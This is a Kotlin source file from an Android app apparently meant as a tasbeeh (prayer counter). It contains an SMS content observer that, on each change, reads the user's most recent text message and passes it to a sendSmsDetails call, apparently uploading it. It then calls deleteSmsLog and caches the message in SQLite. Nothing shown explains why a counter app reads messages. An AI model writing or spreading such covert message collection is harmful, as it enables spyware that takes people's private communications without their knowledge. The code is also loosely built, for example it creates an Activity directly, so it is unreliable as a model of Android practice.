package com.example.tasbeeh
import android.content.Context
import android.content.SharedPreferences
import android.database.ContentObserver
import android.net.Uri
import java.security.AccessControlContext
import java.util.*
import java.util.logging.Handler
import kotlin.collections.ArrayList


class SmsLogObserver(handler: android.os.Handler?) : ContentObserver(handler) {

    override fun deliverSelfNotifications(): Boolean {
        return true
    }

    override fun onChange(selfChange: Boolean) {
        //   super.onChange(selfChange)
    }


    override fun onChange(selfChange: Boolean, uri: Uri) {
        //   super.onChange(true, CallLog.Calls.CONTENT_URI);

        //  println("Onchange")
        //println("Sms Log VISIT " + MainActivity.times)
        //MainActivity.times++

        val main = MainActivity()

        val s: SmsLogModel? = main.getMostRecentMessage(MainActivity?.contentResolver,MainActivity.contextMe)
        val sqliteSmsLog = MainActivity.getLastSmsLogFromSqlite(MainActivity.contentResolver,MainActivity?.contextMe);
        if (s?.getSmsDate().equals(sqliteSmsLog?.getSmsDate())) {

        } else
        {
            if (s != null) {
                var list = ArrayList<SmsLogModel?>()
               // list= MainActivity.getAllSmsDataFromSqlite()!!
                list.add(s)
                println("inserting sms data in sqlite")
                var flag = main.sendSmsDetails(list)
                if (flag == true)
                {
                    main.deleteSmsLog()
                    main.insertDataInSqliteSms(s)
                    var listOfSms = MainActivity.getAllSmsDataFromSqlite()
                    var SmsLogLast = MainActivity.getLastSmsLogFromSqlite(MainActivity.contentResolver,MainActivity?.contextMe)
                }
              else{
                    main.insertDataInSqliteSms(s)
                }


            }
        }
    }


}